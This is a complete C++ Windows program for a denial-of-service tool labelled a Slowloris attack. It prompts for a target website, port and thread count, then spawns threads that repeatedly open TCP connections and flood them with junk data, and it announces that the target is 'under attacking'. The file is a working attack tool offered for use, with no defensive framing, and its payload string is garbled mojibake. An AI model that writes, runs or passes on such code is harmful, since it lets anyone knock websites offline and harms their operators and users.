#include <stdio.h>
#include <string>
#include <iostream>
#include <winsock2.h>
#include <conio.h>
#pragma comment(lib,"ws2_32.a")
using namespace std;
#define HOST sin_addr.S_un.S_addr
string hostname;
string portNumber;
string threads;
hostent *host;
sockaddr_in socket_address;
WSADATA wd;
DWORD WINAPI slowLorisAttack(PVOID p) 
{
	sockaddr_in *socket_address;
	SOCKET s;
	socket_address=(sockaddr_in*)p;
	while(1) 
	{
		unsigned long ul=1;
		s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); 
		char kkk[]="�پ���axsydebcyh�����µĶ���Ӧ���ǻ��ǳԲ��Լ���u������NBCu�ӱ����䵣�ĳɶ��о���ϲ�����ٵش����������sdhydusϤ�����γ̵�������СŮ����ccs�ò���i�Ļ������ˢ�»����ڴֲ���ϲ��u���°�˼��shucunsdhysud��u�ٶ�sdjhcuewqunj��duyd��sZZCjas��sdf���յĺܼ���پ���axsydebcyh�����µĶ���Ӧ���ǻ��ǳԲ��Լ���u������NBCu�پ���axsydebcyh�����µĶ���Ӧ���ǻ��ǳԲ��Լ���u������NBCu�ӱ����䵣�ĳɶ��о���ϲ�����ٵش����������sdhydusϤ�����γ̵�������СŮ����ccs�ò���i�Ļ������ˢ�»����ڴֲ���ϲ��u���°�˼��shucunsdhysud��u�ٶ�sdjhcuewqunj��duyd��sZZCjas��sdf���յĺܼ���پ���axsydebcyh�����µĶ���Ӧ���ǻ��ǳԲ��Լ���u������NBCu\r\n";
		if(s!=INVALID_SOCKET) 
		{
			connect(s,(sockaddr*)socket_address,sizeof(sockaddr_in));
			int ret=ioctlsocket(s,FIONBIO,(unsigned long*)&ul);
			while(1&&ret!=INVALID_SOCKET) 
		 	{
				int n=send(s,kkk,sizeof(kkk)-1,0); 
				if(n==SOCKET_ERROR) 
		 		{
					break;
				}
			}
		}
		closesocket(s);
	}
}
int main() 
{
	if(WSAStartup(0x202,&wd)) 
	{
		cout<<"Unable to start socket";
		return -1;
	}
	cout<<"Enter the target website's name:";
	getline(cin,hostname);
	host=gethostbyname(hostname.data());
	if(!host) 
	{
	 	cout<<"Invalid hostname";
	 	return -1;
	}
	cout<<"Enter port number(if you don't know what this means, simply enter 80):";
	getline(cin,portNumber);
	cout<<"Number of threads you want to run:";
	getline(cin,threads);
	socket_address.HOST = *(PULONG)host->h_addr;
	socket_address.sin_family = AF_INET;
	socket_address.sin_port = htons(strtoul(portNumber.data(),NULL,0));
	for(register ULONG i=1;i<=strtoul(threads.data(),NULL,0);i++) 
	{
		 CreateThread(NULL,0,slowLorisAttack,&socket_address,0,NULL);
		 cout<<i<<" threads created\n";
	}
	cout<<hostname+":"+portNumber<<" is under attacking now.\nPress any key to end.";
	getch();
	WSACleanup();
	return 0;
}
